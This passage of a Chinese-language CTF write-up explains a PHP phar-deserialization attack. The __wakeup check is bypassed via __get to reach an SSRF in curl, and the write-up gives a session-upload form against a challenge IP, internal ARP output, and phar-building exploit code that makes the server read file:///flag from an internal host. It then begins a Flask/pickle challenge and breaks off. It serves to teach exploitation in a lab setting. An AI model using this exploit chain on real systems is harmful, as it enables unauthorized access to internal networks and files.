+    <span class="p">}</span>
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">AdminShow</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$filter</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">schema</span> <span class="o">=</span> <span class="s1">&#39;file:///var/www/html/&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
+        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">schema</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">show</span><span class="p">();</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$value</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$value</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">show</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/usr|auto|log/i&#39;</span> <span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">schema</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
+        <span class="nv">$curl</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
+        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nv">$response</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+        <span class="nv">$src</span> <span class="o">=</span> <span class="s2">&#34;data:jpg;base64,&#34;</span><span class="o">.</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$response</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s2">&#34;&lt;img src=</span><span class="si">{</span><span class="nv">$src</span><span class="si">}</span><span class="s2"> /&gt;&#34;</span><span class="p">;</span>
+
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">schema</span> <span class="o">!==</span> <span class="s1">&#39;file:///var/www/html/&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">schema</span> <span class="o">=</span> <span class="s1">&#39;file:///var/www/html/&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">!==</span> <span class="s1">&#39;admin.png&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s1">&#39;admin.png&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>class.php里面，AdminShow类里面有wakeup方法，这里导致无法修改schema和source</p>
+<p>这里需要绕过AdminShow的wakeup</p>
+<p>再看利用方面，这里的show，是有个file_get_contents的，所以我们这里可以触发一个phar</p>
+<p>然后看，这里upload必须有个$_SESSION，所以我们上传可以添加一个sessionupload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s2">&#34;&lt;http://47.104.95.124:8080/index.php&gt;&#34;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span> <span class="n">enctype</span><span class="o">=</span><span class="s2">&#34;multipart/form-data&#34;</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&#34;file&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;file&#34;</span> <span class="o">/&gt;</span>
+    <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&#34;提交&#34;</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&#34;123&#34;</span> <span class="o">/&gt;</span>
+<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这样让他上传</p>
+<p>而在AdminShow的show方法里面，有ssrf能打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">public</span> <span class="n">function</span> <span class="n">show</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;/usr|auto|log/i&#39;</span> <span class="p">,</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">source</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="err">$</span><span class="n">url</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">schema</span> <span class="o">.</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">source</span><span class="p">;</span>
+        <span class="err">$</span><span class="n">curl</span> <span class="o">=</span> <span class="n">curl_init</span><span class="p">();</span>
+        <span class="n">curl_setopt</span><span class="p">(</span><span class="err">$</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_URL</span><span class="p">,</span> <span class="err">$</span><span class="n">url</span><span class="p">);</span>
+        <span class="n">curl_setopt</span><span class="p">(</span><span class="err">$</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">curl_setopt</span><span class="p">(</span><span class="err">$</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="err">$</span><span class="n">response</span> <span class="o">=</span> <span class="n">curl_exec</span><span class="p">(</span><span class="err">$</span><span class="n">curl</span><span class="p">);</span>
+        <span class="n">curl_close</span><span class="p">(</span><span class="err">$</span><span class="n">curl</span><span class="p">);</span>
+        <span class="err">$</span><span class="n">src</span> <span class="o">=</span> <span class="s2">&#34;data:jpg;base64,&#34;</span><span class="o">.</span><span class="n">base64_encode</span><span class="p">(</span><span class="err">$</span><span class="n">response</span><span class="p">);</span>
+        <span class="n">echo</span> <span class="s2">&#34;&lt;img src={$src} /&gt;&#34;</span><span class="p">;</span>
+
+    <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>而这里进adminshow的show方法在__get里面</p>
+<p>而这里url居然是用了一个拼接，感觉多此一举，这里完全可以一个参数完成的，但是这里画蛇添足的去多加了一个参数去进行拼接，而且schema还没有在class里面定义，也就是说<strong>这个参数可以消失掉</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="err">$</span><span class="n">url</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">schema</span> <span class="o">.</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">source</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里可以看类的构造方法这一块，这里的schema只是在construct里面写死了，所以我们直接舍弃掉schema，就单独用source</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">class</span> <span class="nc">AdminShow</span><span class="p">{</span>
+    <span class="n">public</span> <span class="err">$</span><span class="n">source</span><span class="p">;</span>
+    <span class="n">public</span> <span class="err">$</span><span class="nb">str</span><span class="p">;</span>
+    <span class="n">public</span> <span class="err">$</span><span class="nb">filter</span><span class="p">;</span>
+    <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(</span><span class="err">$</span><span class="n">file</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="err">$</span><span class="n">file</span><span class="p">;</span>
+        <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">schema</span> <span class="o">=</span> <span class="s1">&#39;file:///var/www/html/&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这样wakeup这里的：<code>$this*-&gt;schema</code> 就会找不到schema，从而触发到adminshow的get，进而进入到show方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">public</span> <span class="n">function</span> <span class="n">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">schema</span> <span class="o">!==</span> <span class="s1">&#39;file:///var/www/html/&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">schema</span> <span class="o">=</span> <span class="s1">&#39;file:///var/www/html/&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">!==</span> <span class="s1">&#39;admin.png&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="s1">&#39;admin.png&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这样就可以达成利用了</p>
+<p>读/proc/net/arp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">IP</span> <span class="n">address</span>       <span class="n">HW</span> <span class="nb">type</span>     <span class="n">Flags</span>       <span class="n">HW</span> <span class="n">address</span>            <span class="n">Mask</span>     <span class="n">Device</span>
+<span class="mf">10.10.10.11</span>      <span class="mh">0x1</span>         <span class="mh">0x0</span>         <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">10.10.10.4</span>       <span class="mh">0x1</span>         <span class="mh">0x0</span>         <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">10.10.10.10</span>      <span class="mh">0x1</span>         <span class="mh">0x2</span>         <span class="mi">02</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">10.10.10.1</span>       <span class="mh">0x1</span>         <span class="mh">0x2</span>         <span class="mi">02</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">2</span><span class="n">c</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="mi">76</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">10.10.10.7</span>       <span class="mh">0x1</span>         <span class="mh">0x0</span>         <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">10.10.10.6</span>       <span class="mh">0x1</span>         <span class="mh">0x0</span>         <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">10.10.10.12</span>      <span class="mh">0x1</span>         <span class="mh">0x0</span>         <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">10.10.10.3</span>       <span class="mh">0x1</span>         <span class="mh">0x0</span>         <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">10.10.10.9</span>       <span class="mh">0x1</span>         <span class="mh">0x0</span>         <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">172.18.0.1</span>       <span class="mh">0x1</span>         <span class="mh">0x2</span>         <span class="mi">02</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="n">eb</span>     <span class="o">*</span>        <span class="n">eth0</span>
+<span class="mf">10.10.10.2</span>       <span class="mh">0x1</span>         <span class="mh">0x0</span>         <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>     <span class="o">*</span>        <span class="n">eth1</span>
+<span class="mf">10.10.10.8</span>       <span class="mh">0x1</span>         <span class="mh">0x0</span>         <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>     <span class="o">*</span>        <span class="n">eth1</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这几个内网手动测下去，在10.10.10.10发现有内容</p>
+<p>生成phar文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">AdminShow</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$filter</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+<span class="p">}</span>
+
+<span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
+</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
+</span><span class="c1"></span><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">AdminShow</span><span class="p">(</span><span class="s2">&#34;http://10.10.10.10&#34;</span><span class="p">);</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
+</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;demo.jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件
+</span><span class="c1">//签名自动计算
+</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后触发phar</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802153431100.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802153431100"
+	
+	
+></p>
+<p>有内网能打</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802153454700.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802153454700"
+	
+	
+></p>
+<p>最后的exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">AdminShow</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$filter</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+<span class="p">}</span>
+
+<span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
+</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
+</span><span class="c1"></span><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">AdminShow</span><span class="p">(</span><span class="s2">&#34;http://10.10.10.10/?url=file:///flag&#34;</span><span class="p">);</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
+</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;demo.jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件
+</span><span class="c1">//签名自动计算
+</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20220802153524847.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802153524847"
+	
+	
+></p>
+<h1 id="crash">crash</h1>
+<p>题目说504可以拿到flag，504是Gateway Timeout</p>
+<p>给了源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
+<span class="c1"># import sqlite3</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span><span class="n">request</span><span class="p">,</span> <span class="n">session</span>
+<span class="kn">import</span> <span class="nn">admin</span>
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">,</span><span class="n">static_url_path</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">):</span>
